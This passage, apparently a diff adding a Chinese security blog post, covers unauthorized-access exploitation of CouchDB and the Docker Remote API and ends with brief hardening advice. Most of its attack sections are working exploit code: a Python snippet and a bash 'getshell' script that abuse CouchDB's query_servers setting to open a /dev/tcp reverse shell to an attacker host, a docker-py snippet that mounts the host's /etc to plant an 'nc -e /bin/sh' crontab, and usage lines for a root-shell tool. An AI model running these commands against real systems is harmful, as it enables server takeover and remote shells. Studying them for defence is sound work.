+<span class="k">if</span> <span class="n">version</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="p">(</span><span class="s1">&#39;/_config/query_servers/cmd&#39;</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">command</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/_membership&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;all_nodes&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/_node/{}/_config/query_servers/cmd&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">command</span><span class="p">)</span>
+
+<span class="n">session</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/wooyun&#39;</span><span class="p">)</span>
+<span class="n">session</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/wooyun/test&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s1">&#39;{&#34;_id&#34;: &#34;wooyuntest&#34;}&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">version</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/wooyun/_temp_view?limit=10&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s1">&#39;{&#34;language&#34;:&#34;cmd&#34;,&#34;map&#34;:&#34;&#34;}&#39;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/wooyun/_design/test&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s1">&#39;{&#34;_id&#34;:&#34;_design/test&#34;,&#34;views&#34;:{&#34;wooyun&#34;:{&#34;map&#34;:&#34;&#34;} },&#34;language&#34;:&#34;cmd&#34;}&#39;</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>2.2 bash自动化脚本</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>
+<span class="nb">echo</span> CouchDB getshell - c0debreak - tools.changesec.com
+<span class="nb">echo</span>
+
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$#</span> -ne <span class="m">2</span> <span class="o">]]</span><span class="p">;</span><span class="k">then</span>
+    <span class="nb">echo</span> Usage: <span class="nv">$0</span> http://xx.xx.xx.xx:5984 myserver:myport
+    <span class="nb">exit</span> <span class="m">1</span>
+<span class="k">else</span>
+    <span class="nv">server</span><span class="o">=</span><span class="nv">$1</span>
+    <span class="nv">cb</span><span class="o">=</span><span class="si">${</span><span class="nv">2</span><span class="p">/:/</span><span class="se">\/</span><span class="si">}</span>
+<span class="k">fi</span>
+
+<span class="k">function</span> run<span class="o">()</span> <span class="o">{</span>
+    <span class="nv">cmd</span><span class="o">=</span><span class="nv">$1</span>
+
+    curl -XPUT <span class="s2">&#34;</span><span class="nv">$server</span><span class="s2">/_config/query_servers/cmd&#34;</span> -d <span class="s2">&#34;\&#34;</span><span class="nv">$cmd</span><span class="s2">\&#34;&#34;</span>
+    curl -XPUT <span class="s2">&#34;</span><span class="nv">$server</span><span class="s2">/example&#34;</span>
+    curl -XPUT <span class="s2">&#34;</span><span class="nv">$server</span><span class="s2">/example/record&#34;</span> -d <span class="s1">&#39;{&#34;_id&#34;:&#34;770895a97726d5ca6d70a22173005c7b&#34;}&#39;</span>
+    curl --max-time <span class="m">1</span> <span class="s2">&#34;</span><span class="nv">$server</span><span class="s2">/example/_temp_view?limit=1&#34;</span> -d <span class="s1">&#39;{&#34;language&#34;:&#34;cmd&#34;, &#34;map&#34;:&#34;&#34;}&#39;</span> -H <span class="s1">&#39;Content-Type: application/json&#39;</span>
+<span class="o">}</span>
+
+run <span class="s2">&#34;echo &#39;/bin/bash -i &gt;&amp; /dev/tcp/</span><span class="nv">$cb</span><span class="s2"> 0&gt;&amp;1&#39; &gt; /tmp/shell&#34;</span>
+run <span class="s2">&#34;bash /tmp/shell&#34;</span>
+run <span class="s2">&#34;rm -f /tmp/shell&#34;</span>
+
+curl -XDELETE <span class="s2">&#34;</span><span class="nv">$server</span><span class="s2">/_config/query_servers/cmd&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-05-02_16-37-08.jpg" alt="" /></p>
+
+<h2 id="3-漏洞修复-1"><strong>3.漏洞修复</strong></h2>
+
+<p><em>1、指定CouchDB绑定的IP</em> （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 <code>bind_address = 0.0.0.0</code>，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</p>
+
+<p><em>2、设置访问密码</em> （需要重启CouchDB才能生效） 在 <code>/etc/couchdb/local.ini</code>中找到<code>[admins]</code>字段配置密码。</p>
+
+<h1 id="0x09-docker未授权访问">0x09 Docker未授权访问</h1>
+
+<h2 id="1-基础介绍"><strong>1.基础介绍</strong></h2>
+
+<p><a href="http://www.loner.fm/drops/#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8">http://www.loner.fm/drops/#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8</a></p>
+
+<p>docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供，具体的大家可以看官网介绍。</p>
+
+<p>漏洞发现的起因是，有一位同学在使用docker swarm的时候，发现了管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令，比如访问 <a href="http://host:2375/containers/json">http://host:2375/containers/json</a> 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成，然后他就开始吐槽了，这尼玛太不安全了。</p>
+
+<p>然后我想了想 swarm是用来管理docker集群的，应该放在内网才对。问了之后发现，他是在公网上的几台机器上安装swarm的，并且2375端口的访问策略是开放的，所以可以直接访问。</p>
+
+<h2 id="2-测试环境配置"><strong>2.测试环境配置</strong></h2>
+
+<p>先关闭docker，然后开启：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">sudo service docker stop
+sudo docker daemon  -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock</pre></td></tr></table>
+</div>
+</div>
+<p>绑定Docker Remote Api在指定端口（这里是2375），可以自行测试。</p>
+
+<p>参考API规范进行渗透：<a href="https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/">https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/</a></p>
+
+<p>操作Docker API可以使用python dockert api 完成。</p>
+
+<p><code>pip install docker-py</code></p>
+
+<p>API使用参考：<a href="https://docker-py.readthedocs.io/en/stable/api/#client-api">https://docker-py.readthedocs.io/en/stable/api/#client-api</a></p>
+
+<h2 id="3-漏洞复现"><strong>3.漏洞复现</strong></h2>
+
+<p><strong>3.1 From:phith0n</strong><br />
+利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">import docker
+
+client = docker.DockerClient(base_url=&#39;http://your-ip:2375/&#39;)
+data = client.containers.run(&#39;alpine:latest&#39;, r&#39;&#39;&#39;sh -c &#34;echo &#39;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#39; &gt;&gt; /tmp/etc/crontabs/root&#34; &#39;&#39;&#39;, remove=True, volumes={&#39;/etc&#39;: {&#39;bind&#39;: &#39;/tmp/etc&#39;, &#39;mode&#39;: &#39;rw&#39;}})</pre></td></tr></table>
+</div>
+</div>
+<p>写入crontab文件，成功反弹shell：</p>
+
+<p><img src="https://img.04z.net/img/evi1ox_2018-05-02_17-37-08.png" alt="" /></p>
+
+<p><strong>3.2 python脚本</strong><br />
+<a href="https://github.com/Tycx2ry/docker_api_vul">https://github.com/Tycx2ry/docker_api_vul</a></p>
+
+<ul>
+<li>安装类库<br />
+pip install -r requirements.txt<br /></li>
+<li>查看运行的容器<br />
+python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375<br /></li>
+<li>查看所有的容器<br />
+python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -a<br /></li>
+<li>查看所有镜像<br />
+python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -l<br /></li>
+<li>查看端口映射<br />
+python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -L<br /></li>
+<li>写计划任务（centos,redhat等,加-u参数用于ubuntu等）<br />
+python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口<br />
+python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口<br /></li>
+<li>写sshkey(自行修改脚本的中公钥)<br />
+python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -k<br /></li>
+<li>在容器中执行命令<br />
+python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -e <code>&quot;id&quot;</code> -I 容器id<br /></li>
+<li>删除容器<br />
+python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -c -I 容器id<br /></li>
+<li>修改client api版本<br />
+python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -v 1.22<br /></li>
+<li>查看服务端api版本<br />
+python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -V<br />
+<br /></li>
+</ul>
+
+<p><strong>3.3 其他的一些exp</strong><br />
+<a href="https://github.com/netxfly/docker-remote-api-exp">https://github.com/netxfly/docker-remote-api-exp</a><br />
+<a href="https://github.com/zer0yu/SomePoC/blob/master/Docker/Docker_Remote_API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.py">https://github.com/zer0yu/SomePoC/blob/master/Docker/Docker_Remote_API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.py</a><br />
+<a href="https://github.com/JnuSimba/MiscSecNotes/tree/master/Docker%E5%AE%89%E5%85%A8">https://github.com/JnuSimba/MiscSecNotes/tree/master/Docker%E5%AE%89%E5%85%A8</a></p>
+
+<h2 id="4-防护策略"><strong>4.防护策略</strong></h2>
+
+<p>*1.修改 Docker Remote API 服务默认参数。*注意：该操作需要重启 Docker 服务才能生效。</p>
+
+<p><em>2.修改 Docker 的启动参数：</em><br />
+定位到 DOCKER_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1<br />
+或将默认端口 2375 改为自定义端口<br />
+为 Remote API 设置认证措施。参照 官方文档 配置 Remote API 的认证措施。</p>
+
+<p><em>3.注意：该操作需要重启 Docker 服务才能生效。</em><br />
+修改 Docker 服务运行账号。请以较低权限账号运行 Docker 服务；另外，可以限制攻击者执行高危命令。</p>
+
+<p><em>4.注意：该操作需要重启 Docker 服务才能生效。</em><br />
+设置防火墙策略。如果正常业务中 API 服务需要被其他服务器来访问，可以配置安全组策略或 iptables 策略，仅允许指定的 IP 来访问 Docker 接口。</p>
+
+<h1 id="0x10-未完待续">0x10 未完待续</h1>
+
+<ul>
+<li>关注最新漏洞情况，选择性的进行修复<br /></li>
+<li>梳理内部开放服务，了解哪些对外开放能内网访问的绝不开放公网<br /></li>
+<li>开放公网的服务必须做好访问控制<br /></li>
+<li>避免弱密码；避免弱密码；避免弱密码<br />
+<br /></li>
+</ul>
+
+<hr />
+
+<p><a href="https://www.secpulse.com/archives/61101.html">https://www.secpulse.com/archives/61101.html</a></p>
+
+<p><a href="https://xz.aliyun.com/t/84">https://xz.aliyun.com/t/84</a></p>
+
+<p><a href="https://www.secpulse.com/archives/61046.html">https://www.secpulse.com/archives/61046.html</a></p>
+
+<p><a href="https://paper.seebug.org/409/">https://paper.seebug.org/409/</a></p>
+
+<p><a href="https://www.cnblogs.com/kongzhongqijing/p/6867960.html">https://www.cnblogs.com/kongzhongqijing/p/6867960.html</a></p>
+
+<p><a href="https://b1ngz.github.io/jenkins-anonymous-configure-privilege-expoit/">https://b1ngz.github.io/jenkins-anonymous-configure-privilege-expoit/</a></p>
+
+<p><a href="http://www.mottoin.com/92742.html">http://www.mottoin.com/92742.html</a></p>
+
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/sql-cheat-sheet/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Sql-Cheat-Sheet</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/task-attack/">
+            <span class="next-text nav-default">Task-Attack</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
